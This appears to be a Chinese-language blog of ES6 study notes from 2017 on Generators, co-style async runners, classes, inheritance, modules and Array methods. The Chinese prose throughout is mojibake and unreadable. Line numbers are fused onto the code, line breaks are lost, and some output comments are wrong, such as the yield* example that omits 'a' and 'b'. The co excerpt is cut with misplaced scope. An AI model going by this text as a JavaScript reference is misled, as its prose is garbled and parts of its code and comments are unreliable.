è¡¨è¾¾å¼åœ¨å¦ä¸ªä¸€è¡¨è¾¾å¼ä¸­ï¼Œå¿…é¡»æ”¾åœ¨åœ†æ‹¬å·é‡Œé¢ã€‚æ”¾åœ¨å‡½æ•°å‚æ•°æˆ–æ”¾åˆ°èµ‹å€¼è¡¨è¾¾å¼çš„å³è¾¹ï¼Œå¯ä»¥ä¸åŠ æ‹¬å·ã€‚ 12345678910111213function foo() &#123;&#125;function* demo() &#123; foo(yield 'a', yield 'b') let input = 'abc' + (yield 123)&#125;let f = demo()console.log('f:', f)console.log('f.next():', f.next())console.log('f.next():', f.next())console.log('f.next():', f.next())console.log('f.next():', f.next()) ä»»æ„ä¸€ä¸ªå¯¹è±¡çš„ Symbol.iterator æ–¹æ³•ï¼Œç­‰äºŽè¯¥å¯¹è±¡çš„éåŽ†å™¨ç”Ÿæˆå‡½æ•°ï¼Œè°ƒç”¨è¯¥å‡½æ•°ä¼šè¿”å›žè¯¥å¯¹è±¡çš„ä¸€ä¸ªéåŽ†å™¨å¯¹è±¡ã€‚ ç”±äºŽ Generator å‡½æ•°å°±æ˜¯éåŽ†å™¨ç”Ÿæˆå‡½æ•°ï¼Œä¾æ¬¡å¯ä»¥æŠŠ Generator èµ‹å€¼ç»™å¯¹è±¡çš„ Symbol.iterator,ä»Žè€Œä½¿å¾—è¯¥å¯¹è±¡å…·æœ‰ Interator æŽ¥å£ã€‚ 1234567let myIterable = &#123;&#125;myIterable[Symbol.iterator] = function* () &#123; yield 1 yield 2 yield 3&#125;console.log([...myIterable]) // [1, 2, 3] Generator å‡½æ•°æ‰§è¡ŒåŽï¼Œè¿”å›žä¸€ä¸ªéåŽ†å™¨å¯¹è±¡ã€‚è¯¥å¯¹è±¡æœ¬èº«ä¹Ÿå…·æœ‰ Symbol.iterator å±žæ€§ï¼Œæ‰§è¡ŒåŽè¿”å›žè‡ªèº«ã€‚ 12345function* gen() &#123;&#125;let g = gen()console.log(g[Symbol.iterator]() === g) // true yield è¡¨è¾¾å¼æœ¬èº«æ²¡æœ‰è¿”å›žå€¼ï¼Œæˆ–è€…è¯´æ€»æ˜¯è¿”å›ž undefinedã€‚next æ–¹æ³•å¯ä»¥å¸¦ä¸€ä¸ªå‚æ•°ï¼Œè¯¥å‚æ•°å°±ä¼šè¢«å½“ä½œä¸Šä¸€ä¸ª yield è¡¨è¾¾å¼çš„è¿”å›žå€¼ã€‚ 123456789101112131415function* foo(x) &#123; let y = 2 * (yield x + 1) let z = yield y / 3 return x + y + z&#125;let a = foo(5)console.log(a.next()) // &#123;value: 6, done: false&#125;console.log(a.next()) // &#123;value: NaN, done: false&#125;console.log(a.next()) // &#123;value: NaN, done: true&#125;let b = foo(5)console.log(b.next()) // &#123;value: 6, done: false&#125;console.log(b.next(3)) // &#123;value: 2, done: false&#125;console.log(b.next(6)) // &#123;value: 17, done: true&#125; éåŽ†æ–æ³¢æ‹‰å¥‘æ•°åˆ— 1234567891011function* fibonacci(large) &#123; let [prev, curr] = [0, 1] for (let i = 0; i &lt; large; i++) &#123; ;[prev, curr] = [curr, prev + curr] yield curr &#125;&#125;for (let n of fibonacci(100)) &#123; console.log(n)&#125; åŽŸç”Ÿå¯¹è±¡æ²¡æœ‰ iterator æŽ¥å£ï¼Œæ— æ³•ç”¨ forâ€¦of éåŽ†ï¼Œå¯ä»¥é€šè¿‡ Generator å‡½æ•°åŠ ä¸ŠéåŽ†æŽ¥å£ã€‚ 123456789101112function* objectEntries(obj) &#123; let propKeys = Reflect.ownKeys(obj) for (let propKey of propKeys) &#123; yield [propKey, obj[propKey]] &#125;&#125;let o = &#123; first: 'wu', last: 'wh' &#125;for (let [key, value] of objectEntries(o)) &#123; console.log(`$&#123;key&#125;: $&#123;value&#125;`)&#125; æ‰©å±•è¿ç®—ç¬¦ã€è§£æž„èµ‹å€¼å’Œ Array.from æ–¹æ³•å†…éƒ¨è°ƒç”¨éƒ½æ˜¯éåŽ†å™¨æŽ¥å£ã€‚ 1234567891011121314151617function* numbers() &#123; yield 1 yield 2 yield 3 return 0 yield 4&#125;// æ‰©å±•è¿ç®—ç¬¦console.log([...numbers()])// Array.from()console.log(Array.from(numbers()))// è§£æž„èµ‹å€¼let [x, y] = numbers()console.log(x, y) åœ¨ Generator å‡½æ•°å†…éƒ¨ï¼Œè°ƒç”¨å¦ä¸€ä¸ª Generator å‡½æ•°ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯æ²¡æœ‰æ•ˆæžœçš„ã€‚ yield* åŽé¢çš„ Generator å‡½æ•°ï¼ˆæ²¡æœ‰ return è¯­å¥æ—¶ï¼‰ï¼Œç­‰åŒäºŽåœ¨ Generator å†…éƒ¨éƒ¨ç½²äº†ä¸€ä¸ª forâ€¦of å‡½æ•°ã€‚ 1234567891011121314function* foo() &#123; yield 'a' yield 'b'&#125;function* bar() &#123; yield 'x' yield* foo() yield 'y'&#125;for (let v of bar()) &#123; console.log(v) // "x" // "y"&#125; è¢«ä»£ç†çš„ Generator å‡½æ•°æœ‰ return è¯­å¥ï¼Œé‚£ä¹ˆå°±å¯ä»¥å‘ä»£ç†å®ƒçš„ Generator å‡½æ•°è¿”å›žæ•°æ®ã€‚ 123456789101112131415161718192021function* foo() &#123; yield 2 yield 3 return 'foo'&#125;function* bar() &#123; yield 1 let v = yield* foo() console.log('v: ', v) yield 4&#125;let it = bar()console.log(it.next()) // &#123;value: 1, done: false&#125;console.log(it.next()) // &#123;value: 2, done: false&#125;console.log(it.next()) // &#123;value: 3, done: false&#125;console.log(it.next()) // v: fooconsole.log(it.next()) // &#123;value: 4, done: false&#125;console.log(it.next()) // &#123; value: undefined, done: true &#125; å°† Generator å‡½æ•°å†…éƒ¨ this æŒ‡å‘å®ƒçš„åŽŸåž‹ä¸Šï¼Œå¯ä»¥ new å‘½ä»¤ã€‚ 1234567891011121314151617181920function* gen() &#123; this.a = 1 yield (this.b = 2) yield (this.c = 3)&#125;function F() &#123; return gen.call(gen.prototype)&#125;var f = new F()// éåŽ†å®ŒåŽï¼Œæ‰ä¼šæœ‰ç›¸åº”çš„å±žæ€§console.log(f.next()) // &#123;value: 2, done: false&#125;console.log(f.next()) // &#123;value: 3, done: false&#125;console.log(f.next()) // &#123;value: undefined, done: true&#125;console.log(f.a) // 1console.log(f.b) // 2console.log(f.c) // 3 return æ–¹æ³•è¿”å›žç»™å®šçš„å€¼ï¼Œå¹¶ä¸”ç»ˆç»“éåŽ† Generator å‡½æ•°ã€‚ 1234567891011function* gen() &#123; yield 1 yield 2 yield 3&#125;let g = gen()console.log(g.next())g.return('foo')console.log(g.next()) Generator å‡½æ•°å†…éƒ¨æ²¡æœ‰éƒ¨ç½² tryâ€¦catchï¼Œé‚£ä¹ˆ throw æŠ›å‡ºçš„é”™è¯¯ï¼Œè¢«å¤–éƒ¨ tryâ€¦catch æ•èŽ·ã€‚Generator å‡½æ•°å†…éƒ¨å’Œå¤–éƒ¨ï¼Œéƒ½æ²¡æœ‰éƒ¨ç½² tryâ€¦catchï¼Œç¨‹åºå°†ä¼šæŠ¥é”™ï¼Œä¸­æ–­æ‰§è¡Œã€‚ 1234567891011121314151617181920212223242526function* gen() &#123; while (true) &#123; // try &#123; // yield; // &#125; // catch(e) &#123; // console.log("å†…éƒ¨æ•èŽ·", e); // &#125; yield console.log('å†…éƒ¨æ•èŽ·', e) &#125;&#125;let g = gen()g.next()// g.throw("a");// g.throw("b");try &#123; g.throw('a') g.throw('b')&#125; catch (e) &#123; console.log('å¤–éƒ¨æ•èŽ·', e)&#125; next()ã€throw()ã€return()è¿™ä¸‰ä¸ªæ–¹æ³•æœ¬è´¨æ—¶åŒä¸€ä»¶äº‹ï¼Œå¯ä»¥æ”¾åœ¨ä¸€èµ·ç†è§£ã€‚å®ƒä»¬çš„ä½œç”¨éƒ½æ˜¯è®© Generator å‡½æ•°æ¢å¤æ‰§è¡Œï¼Œå¹¶ä¸”ä½¿ç”¨ä¸åŒçš„è¯­å¥æ›¿æ¢ yield è¡¨è¾¾å¼ã€‚ 12345678910111213141516function* gen(x, y) &#123; let res = yield x + y return res&#125;let g = gen(1, 2)console.log(g.next()) // &#123;value: 3, done: false&#125;// ç›¸å½“äºŽæŠŠ let res = yield x + y; æ¢æˆ let res = 1;console.log(g.next(1)) // &#123;value: 1, done: true&#125;// ç›¸å½“äºŽæŠŠ let res = yield x + y; æ¢æˆ let res = throw(new Error("something wrong"));g.throw(new Error('something wrong')) // Uncaught Error: something wrong// ç›¸å½“äºŽæŠŠ let res = yield x + y; æ¢æˆ let res = return 2;console.log(g.return(2)) â€”â€” 2017/12/26 ES6 ä¹‹ Generator å‡½æ•°çš„å¼‚æ­¥åº”ç”¨å¯¹äºŽå¤šä¸ªå¼‚æ­¥æ“ä½œï¼Œè¦ç­‰åˆ°ä¸Šä¸€ä¸ªæ“ä½œå®Œæ‰æ‰§è¡Œä¸‹ä¸€ä¸ªï¼Œè¿™æ—¶å€™å°±éœ€è¦å°è£…ä¸€ä¸ªï¼ŒGenerator å‡½æ•°è‡ªåŠ¨æ‰§è¡Œå™¨ã€‚ 1234567891011121314151617181920function run(fn) &#123; let g = fn() function next(err, data) &#123; let res = g.next(data) if (res.done) return res.value(next) &#125; next()&#125;function* gen() &#123; let f1 = yield readFileThunk('fileA') let f2 = yield readFileThunk('fileB') // ... let fn = yield readFileThunk('fileN')&#125;run(gen) å›žè°ƒå‡½æ•°ã€‚å°†å¼‚æ­¥æ“ä½œåŒ…è£…æˆ Thunk å‡½æ•°ï¼Œåœ¨å›žè°ƒå‡½æ•°é‡Œé¢äº¤å›žæ‰§è¡Œæƒã€‚ Promise å¯¹è±¡ã€‚å°†å¼‚æ­¥æ“ä½œåŒ…è£…æˆ Promise å¯¹è±¡ï¼Œç”¨ then æ–¹æ³•äº¤å›žæ‰§è¡Œæƒã€‚ 12345678910111213141516171819202122232425262728293031323334// coå‡½æ•°æºç function co(gen) &#123; var ctx = this return new Promise(function (resolve, reject) &#123; if (typeof gen === 'function') gen = gen.call(ctx) if (!gen || typeof gen.next !== 'function') return resolve(gen) onFulfilled() function onFulfilled(res) &#123; var ret try &#123; ret = gen.next(res) &#125; catch (e) &#123; return reject(e) &#125; next(ret) &#125; &#125;)&#125;function next(ret) &#123; if (ret.done) return resolve(ret.value) var value = toPromise.call(ctx, ret.value) if (value &amp;&amp; isPromise(value)) return value.then(onFulfilled, onRejected) return onRejected( new TypeError( 'You may only yield a function, promise, generator, array, or object, ' + 'but the following object was passed: "' + String(ret.value) + '"' ) )&#125; â€”â€” 2017/12/27 12345678910class Point &#123; constructor(x, y) &#123; this.x = x; this.y = y; &#125; toString() &#123; return '(' + this.x + ', ' + this.y + ')'; &#125;&#125; ç±»çš„æ•°æ®ç±»åž‹å°±æ˜¯å‡½æ•° 1console.log(typeof Point); // function ç±»æœ¬èº«å°±æŒ‡å‘æž„é€ å‡½æ•° 1console.log(Point === Point.prototype.constructor); // true ç›´æŽ¥å¯¹ç±»ä½¿ç”¨ new å‘½ä»¤ 12let p = new Point(1, 2);console.log(p.toString()); // (1, 2) x å’Œ y éƒ½æ˜¯å¯¹è±¡ point è‡ªèº«çš„å±žæ€§ï¼ˆå®šä¹‰åœ¨ this å˜é‡ä¸Šï¼‰ï¼ŒtoString æ˜¯åŽŸåž‹å¯¹è±¡çš„å±žæ€§ï¼ˆå®šä¹‰åœ¨ Point ç±»ä¸Šï¼‰ å®žä¾‹ä¸Šè°ƒç”¨çš„æ–¹æ³•ï¼Œå°±æ˜¯è°ƒç”¨åŽŸåž‹ä¸Šçš„æ–¹æ³• 1console.log(p.toString === Point.prototype.toString); // true ç»™å®žä¾‹çš„åŽŸåž‹ä¸Šæ·»åŠ æ–¹æ³• 123456Reflect.getPrototypeOf(p).getX = function() &#123; console.log(this.x);&#125;;let p1 = new Point(3, 4);p1.getX(); // 3 */ ç±»çš„å±žæ€§åï¼Œå¯ä»¥é‡‡ç”¨è¡¨è¾¾å¼ 1234567891011121314let methodName = "getArea";class Square &#123; constructor() &#123; &#125; [methodName]() &#123; console.log("get area..."); &#125;&#125;let sq = new Square();sq.getArea(); // get area... ç±»ä¸­æ²¡æœ‰å®šä¹‰ constructor æ–¹æ³•ï¼Œjs å¼•æ“Žä¼šè‡ªåŠ¨ä¸ºå®ƒæ·»åŠ ä¸€ä¸ªç©ºçš„ constructor æ–¹æ³•ï¼Œconstructor æ–¹æ³•é»˜è®¤è¿”å›žå®žä¾‹å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šè¿”å›žå¦ä¸€ä¸ªå¯¹è±¡ 1234567class Foo &#123; constructor() &#123; return Object.create(null); &#125;&#125;console.log(new Foo() instanceof Foo); // false ç”¨è¡¨è¾¾å¼è¡¨ç¤ºä¸€ä¸ªç±»ï¼Œç±»çš„åç§°æ˜¯ MyClassï¼ŒMe åªåœ¨ Class å†…éƒ¨ä»£ç å¯ç”¨ï¼ŒæŒ‡ä»£å½“å‰ç±»ï¼Œå¦‚æžœå†…éƒ¨æ²¡æœ‰ä½¿ç”¨åˆ°çš„è¯ï¼Œå¯ä»¥çœç•¥ Me 1234567891011121314151617const MyClass = class Me &#123; getClassName() &#123; return Me.name; &#125; get prop() &#123; return "getter"; &#125; set prop(value) &#123; console.log("setter:" + value); &#125;&#125;;let inst = new MyClass();console.log(inst.getClassName()); // Melet inst1 = new Me(); // Uncaught ReferenceError: Me is not definedconsole.log(inst1.getClassName()); åœ¨ç±»çš„å†…éƒ¨ä½¿ç”¨ get å’Œ set å…³é”®å­—ï¼Œå¯¹æŸä¸ªå±žæ€§è®¾ç½®å­˜å€¼å‡½æ•°å’Œå–å€¼å‡½æ•°ï¼Œæ‹¦æˆªè¯¥å±žæ€§çš„å­˜å–è¡Œä¸º 12inst.prop = 123; // setter:123console.log(inst.prop); // getter forâ€¦of å¾ªçŽ¯è‡ªåŠ¨è°ƒç”¨éåŽ†å™¨ 12345678910111213141516171819202122232425262728293031323334class Foo &#123; constructor(...args) &#123; this.args = args; console.log("new.target:", new.target === Foo); &#125; *[Symbol.iterator]() &#123; for(let arg of this.args) &#123; yield arg; &#125; &#125; static sayHi() &#123; return this.returnHi(); &#125; static returnHi() &#123; return "hi"; &#125; returnHi() &#123; return "hello"; &#125;&#125;class Bar extends Foo &#123; static childSayHi() &#123; return super.sayHi() + " child"; &#125;&#125;for(let x of new Foo("hello", "world")) &#123; console.log(x); // hello world&#125; æ‰€æœ‰ç±»ä¸­å®šä¹‰çš„æ–¹æ³•ï¼Œéƒ½ä¼šè¢«å®žä¾‹ç»§æ‰¿ï¼Œå¦‚æžœåœ¨ä¸€ä¸ªæ–¹æ³•å‰ï¼ŒåŠ ä¸Š static å…³é”®å­—ï¼Œå°±è¡¨ç¤ºè¯¥æ–¹æ³•ä¸ä¼šè¢«å®žä¾‹ç»§æ‰¿ï¼Œè€Œæ˜¯ç›´æŽ¥é€šè¿‡ç±»æ¥è°ƒç”¨ï¼Œæˆä¸ºâ€œé™æ€æ–¹æ³•â€ã€‚ é™æ€æ–¹æ³•ä¸­çš„ this æŒ‡å‘ Foo ç±»ï¼Œè€Œä¸æ˜¯å®žä¾‹ã€‚é™æ€æ–¹æ³•å¯ä»¥ä¸Žéžé™æ€æ–¹æ³•é‡å 12console.log(Foo.sayHi()); // hiconsole.log(new Foo().sayHi()); //Uncaught TypeError: (intermediate value).sayHi is not a function çˆ¶ç±»çš„é™æ€æ–¹æ³•å¯ä»¥è¢«å­ç±»ç»§æ‰¿ 1console.log(Bar.sayHi()); // hi é™æ€æ–¹æ³•å¯ä»¥ä»Ž super å¯¹è±¡ä¸Šè°ƒç”¨ 1console.log(Bar.childSayHi()); // hi child å­ç±»ç»§æ‰¿çˆ¶ç±»æ—¶ï¼Œnew.target ä¼šè¿”å›žå­ç±» 1console.log(new Bar()); // false ES6 ä¹‹ Class çš„ç»§æ‰¿å­ç±»å¿…é¡»åœ¨ constructor æ–¹æ³•ä¸­è°ƒç”¨ super æ–¹æ³•ï¼Œå¦åˆ™æ–°å»ºå®žä¾‹æ—¶ä¼šæŠ¥é”™ï¼Œå¦‚æžœå­ç±»æ²¡æœ‰å®šä¹‰ constructor æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šè¢«é»˜è®¤æ·»åŠ ã€‚åœ¨å­ç±»æž„é€ å‡½æ•°ä¸­ï¼Œåªæœ‰è°ƒç”¨ super ä¹‹åŽï¼Œæ‰å¯ä»¥ä½¿ç”¨ this å…³é”®å­—ï¼Œå¦åˆ™æŠ¥é”™ã€‚ 123456789101112class ColorPaint extends Point &#123; constructor(x, y, color) &#123; // this.color = color; super(x, y) this.color = color &#125;&#125;let cp = new ColorPaint(25, 8, 'red')console.log(cp instanceof Point) // trueconsole.log(cp instanceof ColorPaint) // trueconsole.log(Reflect.getPrototypeOf(ColorPaint) === Point) // true super è™½ç„¶ä»£è¡¨äº†çˆ¶ç±» A çš„æž„é€ å‡½æ•°ï¼Œä½†æ˜¯è¿”å›žçš„æ˜¯å­ç±» B çš„å®žä¾‹ï¼Œå³ super å†…éƒ¨ this æŒ‡çš„æ˜¯ Bã€‚ 1234567891011121314class A &#123; constructor() &#123; console.log(new.target.name) &#125;&#125;class B extends A &#123; constructor() &#123; super() &#125;&#125;new A() // Anew B() // B super ä½œä¸ºå¯¹è±¡æ—¶ï¼Œåœ¨æ™®é€šæ–¹æ³•ä¸­ï¼ŒæŒ‡å‘çˆ¶ç±»çš„åŽŸåž‹å¯¹è±¡ï¼›åœ¨é™æ€æ–¹æ³•ä¸­æŒ‡å‘çˆ¶ç±»ã€‚ 1234567891011121314class A &#123; p() &#123; return 2 &#125;&#125;class B extends A &#123; constructor() &#123; super() console.log(super.p()) &#125;&#125;let b = new B() ES6 è§„å®šï¼Œé€šè¿‡è°ƒç”¨çˆ¶ç±»æ–¹æ³•æ—¶ï¼Œæ–¹æ³•å†…éƒ¨çš„ this æŒ‡å‘å­ç±»ã€‚ 12345678910111213141516171819202122class A &#123; constructor() &#123; this.x = 1 &#125; print() &#123; console.log(this.x) &#125;&#125;class B extends A &#123; constructor() &#123; super() this.x = 2 &#125; m() &#123; // å®žé™…ä¸Šæ‰§è¡Œçš„æ˜¯super.print.call(this) super.print() &#125;&#125;let b = new B()b.m() // 2 å¦‚æžœ super ä½œä¸ºå¯¹è±¡ï¼Œç”¨åœ¨é™æ€æ–¹æ³•ä¸­ï¼Œè¿™æ—¶ super å°†æŒ‡å‘çˆ¶ç±»ï¼Œè€Œä¸æ˜¯çˆ¶ç±»åŽŸåž‹å¯¹è±¡ã€‚ 1234567891011121314151617181920212223242526class Parent &#123; static myMethod(msg) &#123; console.log('static ', msg) &#125; myMethod(msg) &#123; console.log('instance ', msg) &#125;&#125;class Child extends Parent &#123; static myMethod(msg) &#123; super.myMethod(msg) &#125; myMethod(msg) &#123; super.myMethod(msg) &#125;&#125;// è°ƒç”¨é™æ€æ–¹æ³•Child.myMethod(1) // static 1// è°ƒç”¨åŽŸåž‹æ–¹æ³•var c = new Child() // instance 2c.myMethod(2) 123456class A &#123;&#125;class B extends A &#123;&#125;console.log(B.__proto__ === A) // trueconsole.log(B.prototype.__proto__ === A.prototype) // true A ä½œä¸ºä¸€ä¸ªåŸºç±»ï¼Œå°±æ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°ï¼Œæ‰€ä»¥ç›´æŽ¥ç»§æ‰¿ Funtion.prototypeï¼ŒA è°ƒç”¨åŽè¿”å›žä¸€ä¸ªç©ºå¯¹è±¡ï¼Œæ‰€ä»¥ï¼ŒA.prototype.protoæŒ‡å‘æž„é€ å‡½æ•°çš„ prototype å±žæ€§ã€‚ 1234class A &#123;&#125;console.log(A.__proto__ === Function.prototype) // trueconsole.log(A.prototype.__proto__ === Object.prototype) // true åŽŸç”Ÿæž„é€ å‡½æ•°å¯ä»¥è¢«ç»§æ‰¿ 12345678910111213141516171819202122232425class VersionedArray extends Array &#123; constructor() &#123; super() this.history = [[]] &#125; commit() &#123; this.history.push(this.slice()) &#125; revert() &#123; this.splice(0, this.length, ...this.history[this.history.length - 1]) &#125;&#125;let x = new VersionedArray()x.push(1)x.push(2)console.log(x)console.log(x.history)x.commit()console.log(x.history)x.push(3)console.log(x.history) ES6 ä¹‹ Moduleexport é€šå¸¸æƒ…å†µä¸‹ï¼Œexport è¾“å‡ºçš„å˜é‡å°±æ˜¯æœ¬æ¥çš„åå­—ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥ä½¿ç”¨ as å…³é”®å­—é‡å‘½åã€‚ 1234function v1() &#123;&#125;function v2() &#123;&#125;export &#123; v1 as streamV1, v2 as streamV2 &#125; export å‘½ä»¤è§„å®šæ˜¯å¯¹å¤–æŽ¥å£ï¼Œå¿…é¡»ä¸Žæ¨¡å—å†…éƒ¨å˜é‡å»ºç«‹ä¸€ä¸€å¯¹åº”å…³ç³»ã€‚ 1234567891011121314151617// å˜é‡å†™æ³•ä¸€export var m = 1// å˜é‡å†™æ³•äºŒvar m = 1export &#123; m &#125;// å˜é‡å†™æ³•ä¸‰var n = 1export &#123; n as m &#125;// å‡½æ•°å†™æ³•ä¸€export function f() &#123;&#125;// å‡½æ•°å†™æ³•äºŒfunction f() &#123;&#125;export &#123; f &#125; export è¯­å¥è¾“å‡ºçš„æŽ¥å£ï¼Œä¸Žå…¶å¯¹åº”çš„å€¼æ˜¯åŠ¨æ€ç»‘å®šå…³ç³» 12export var foo = 'bar'setTimeout(() =&gt; (foo = 'baz'), 500) importimport å‘½ä»¤å…·æœ‰æå‡æ•ˆæžœï¼Œä¼šæå‡åˆ°æ•´ä¸ªæ¨¡å—çš„å¤´éƒ¨ï¼Œé¦–å…ˆæ‰§è¡Œã€‚ 123foo()import &#123; foo &#125; from 'my_module' ç›®å‰é˜¶æ®µï¼Œé€šè¿‡ Babel è½¬ç ï¼ŒCommonJS æ¨¡å—çš„ require å‘½ä»¤å’Œ ES6 æ¨¡å—çš„ import å‘½ä»¤ï¼Œå¯ä»¥å†™åœ¨åŒä¸€ä¸ªæ¨¡å—é‡Œé¢ï¼Œä½†æ˜¯æœ€å¥½ä¸è¦è¿™æ ·åšã€‚å› ä¸º import åœ¨é™æ€è§£æžé˜¶æ®µæ‰§è¡Œï¼Œæ‰€ä»¥å®ƒæ˜¯ä¸€ä¸ªæ¨¡å—ä¹‹ä¸­æœ€æ—©æ‰§è¡Œçš„ã€‚ æ³¨æ„ï¼Œæ¨¡å—æ•´ä½“åŠ è½½æ‰€åœ¨çš„é‚£ä¸ªå¯¹è±¡ï¼ˆä¸Šä¾‹æ˜¯ circleï¼‰ï¼Œåº”è¯¥æ˜¯å¯ä»¥é™æ€åˆ†æžçš„ï¼Œæ‰€ä»¥ä¸å…è®¸è¿è¡Œæ—¶æ”¹å˜ã€‚ä¸‹é¢çš„å†™æ³•éƒ½æ˜¯ä¸å…è®¸çš„ã€‚ 12345import * as circle from './circle'// ä¸‹é¢ä¸¤è¡Œéƒ½æ˜¯ä¸å…è®¸çš„circle.foo = 'hello'circle.area = function () &#123;&#125; export default å‘½ä»¤ä¸ºæ¨¡å—æŒ‡å®šé»˜è®¤è¾“å‡ºã€‚å…¶ä»–æ¨¡å—åŠ è½½è¯¥æ¨¡å—æ—¶ï¼Œimport å‘½ä»¤å¯ä»¥ä¸ºè¯¥åŒ¿åå‡½æ•°æŒ‡å®šä»»æ„åå­—ã€‚ ç¬¬ä¸€ç»„æ˜¯ä½¿ç”¨ export default æ—¶ï¼Œå¯¹åº”çš„ import è¯­å¥ä¸éœ€è¦ä½¿ç”¨å¤§æ‹¬å·ï¼›ç¬¬äºŒç»„æ˜¯ä¸ä½¿ç”¨ export default æ—¶ï¼Œå¯¹åº”çš„ import è¯­å¥éœ€è¦ä½¿ç”¨å¤§æ‹¬å·ã€‚ 123456789101112131415// ç¬¬ä¸€ç»„export default function crc32() &#123; // è¾“å‡º // ...&#125;import crc32 from 'crc32' // è¾“å…¥// ç¬¬äºŒç»„export function crc32() &#123; // è¾“å‡º // ...&#125;import &#123; crc32 &#125; from 'crc32' // è¾“å…¥ â€”â€” 2017/12/28 ES6 ä¹‹ Module åŠ è½½ES6 æ¨¡å—ä¸Ž CommonJS æ¨¡å—ä¹‹é—´çš„å·®å¼‚ï¼š CommonJS æ¨¡å—è¾“å‡ºçš„æ˜¯ä¸€ä¸ªå€¼çš„æ‹·è´ï¼ŒES6 æ¨¡å—è¾“å‡ºçš„æ˜¯å€¼çš„å¼•ç”¨ã€‚ CommonJS æ¨¡å—æ˜¯è¿è¡Œæ—¶åŠ è½½ï¼ŒES6 æ¨¡å—æ˜¯ç¼–è¯‘æ—¶è¾“å‡ºæŽ¥å£ã€‚ ES6 ä¹‹ç¼–ç¨‹é£Žæ ¼ åœ¨ let å’Œ const ä¹‹é—´ï¼Œå»ºè®®ä¼˜å…ˆä½¿ç”¨ constï¼Œå°¤å…¶æ˜¯åœ¨å…¨å±€çŽ¯å¢ƒï¼Œä¸åº”è¯¥è®¾ç½®å˜é‡ï¼Œåªåº”è®¾ç½®å¸¸é‡ã€‚ æ‰€æœ‰çš„å‡½æ•°éƒ½åº”è¯¥è®¾ç½®ä¸ºå¸¸é‡ã€‚ é™æ€å­—ç¬¦ä¸²ä¸€å¾‹ä½¿ç”¨å•å¼•å·æˆ–åå¼•å·ï¼Œä¸ä½¿ç”¨åŒå¼•å·ã€‚åŠ¨æ€å­—ç¬¦ä¸²ä½¿ç”¨åå¼•å·ã€‚ ç®­å¤´å‡½æ•°å–ä»£ Function.prototype.bindï¼Œä¸åº”å†ç”¨ self/_this/that ç»‘å®š thisã€‚ æ³¨æ„åŒºåˆ† Object å’Œ Mapï¼Œåªæœ‰æ¨¡æ‹ŸçŽ°å®žä¸–ç•Œçš„å®žä½“å¯¹è±¡æ—¶ï¼Œæ‰ä½¿ç”¨ Objectã€‚å¦‚æžœåªæ˜¯éœ€è¦ key: value çš„æ•°æ®ç»“æž„ï¼Œä½¿ç”¨ Map ç»“æž„ã€‚å› ä¸º Map æœ‰å†…å»ºçš„éåŽ†æœºåˆ¶ã€‚ å¦‚æžœæ¨¡å—åªæœ‰ä¸€ä¸ªè¾“å‡ºå€¼ï¼Œå°±ä½¿ç”¨ export defaultï¼Œå¦‚æžœæ¨¡å—æœ‰å¤šä¸ªè¾“å‡ºå€¼ï¼Œå°±ä¸ä½¿ç”¨ export defaultï¼Œexport default ä¸Žæ™®é€šçš„ export ä¸è¦åŒæ—¶ä½¿ç”¨ã€‚ â€”â€” 2017/12/28 ES6 ä¹‹æ•°ç»„å¤åˆ¶æ•°ç»„ 12345const a1 = [1, 2]// const a2 = [...a1];const [...a2] = a1a2[0] = 2console.log('a1:', a1) // [1, 2] æ‹“å±•è¿ç®—ç¬¦å€¼ä¼šéƒ¨ç½²äº† iterator æŽ¥å£çš„å¯¹è±¡è½¬åŒ–ä¸ºæ•°ç»„ï¼ŒåŒ…æ‹¬å­—ç¬¦ä¸²ã€Setã€Mapã€generator å‡½æ•°ã€æ•°ç»„ã€NodeList ç­‰ ç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼ˆarray-like objectï¼‰å’Œå¯éåŽ†ï¼ˆiterableï¼‰çš„å¯¹è±¡å¯ç”¨ Array.from æ–¹æ³•è½¬åŒ– 123456let arrayLike = &#123; 0: 'a', 1: 'b', length: 1&#125;console.log(Array.from(arrayLike)) // ["a"] Array.from è¿˜å¯ä»¥æŽ¥å—ç¬¬äºŒä¸ªå‚æ•°ï¼Œä½œç”¨ç±»ä¼¼äºŽæ•°ç»„çš„ map æ–¹æ³•ï¼Œç”¨æ¥å¯¹æ¯ä¸ªå…ƒç´ è¿›è¡Œå¤„ç†ï¼Œå°†å¤„ç†åŽçš„å€¼æ”¾å…¥è¿”å›žçš„æ•°ç»„ã€‚ 1console.log(Array.from(arrayLike, (x) =&gt; x.repeat(2))) Array.of æ–¹æ³•ç”¨äºŽå°†ä¸€ç»„å€¼ï¼Œè½¬åŒ–ä¸ºæ•°ç»„ 12console.log(Array.of(3, 10, 9))console.log(Array.of()) å°†æŒ‡å®šä½ç½®çš„æˆå‘˜å¤åˆ¶åˆ°å…¶ä»–ä½ç½® 1console.log([1, 2, 3, 4, 5].copyWithin(0, 3, 4)) // [4, 2, 3, 4, 5] find æ‰¾å‡ºç¬¬ä¸€ä¸ªç¬¦åˆæ¡ä»¶æ•°ç»„æˆå‘˜ï¼ŒfindIndex æ‰¾å‡ºç¬¬ä¸€ä¸ªç¬¦åˆæ¡ä»¶æ•°ç»„æˆå‘˜ç´¢å¼• 12let f = [1, 3, 5, 7].find((n) =&gt; n &gt; 3)console.log(f) fill å¡«å……æ•°ç»„ 1console.log(new Array(3).fill(6)) fill æ–¹æ³•è¿˜å¯ä»¥æŽ¥å—ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œç”¨äºŽæŒ‡å®šå¡«å……çš„èµ·å§‹ä½ç½®å’Œç»“æŸä½ç½®ã€‚ 1console.log([1, 2, 3, 4].fill('a', 1, 4)) // [1, "a", "a", "a"] include è¡¨ç¤ºæŸä¸ªæ•°ç»„æ˜¯å¦åŒ…å«ç»™å®šçš„å€¼ç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºæœç´¢çš„èµ·å§‹ä½ç½® 12console.log([1, 2, 3, NaN].includes(NaN)) //trueconsole.log([1, 2, 3, 4, 5].includes(3, 1)) // true æ•°ç»„ç©ºä½ç›¸å…³ 1234567891011121314151617181920212223242526272829// æ•°ç»„ç©ºä½æ˜¯æ²¡æœ‰ä»»ä½•å€¼çš„console.log(0 in [undefined, undefined, undefined]) // trueconsole.log(0 in [, ,]) // falselet arr = [, 